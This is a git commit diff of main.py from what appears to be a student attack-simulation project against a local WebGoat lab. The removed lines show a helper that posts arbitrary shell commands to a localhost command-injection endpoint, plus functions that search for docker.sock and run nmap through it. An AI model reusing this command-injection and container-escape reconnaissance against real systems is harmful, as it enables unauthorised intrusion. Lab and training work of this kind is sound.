78b9ff8322da55ebfc3e54e308a743a300788c91
Yohan Kim <yohan.kim.1@etsmtl.net>
2023-03-26 23:47:24 -0400

    basic idea behind scenarios

--- main.py
+++ main.py
@@ -1,24 +1,9 @@
-import sys
-import requests
-import pwn
+from threading import Thread
+import scenarios.webgoat_sample as wg
 
-def exec(command: str) -> tuple[str, str]:
-    """Executes the given command on the remote machine."""
-    headers = {'Content-Type': 'text/plain'}
-    response = requests.post('http://localhost:8080/api/user/command-injection', headers=headers, data=command)
-    body = response.json()
+if __name__ == '__main__':
+    t1 = Thread(target=wg.run, args=["t1",])
+    t2 = Thread(target=wg.run, args=["t2",])
 
-    if 'err' in body:
-        print(body)
-        raise Exception(body['err'])
-
-    return body['stdout'], body['stderr']
-
-def checkDocker():
-    for path in ['/var', '/host/var']:
-        print(exec(f"find {pwn.sh_string(path)} -type f -name docker.sock"))
-
-def nmapScan(ipAddr):
-    exec(f"nmap {ipAddr}")
-
-#if __name__ == "__main__":
+    t1.start()
+    t2.start()
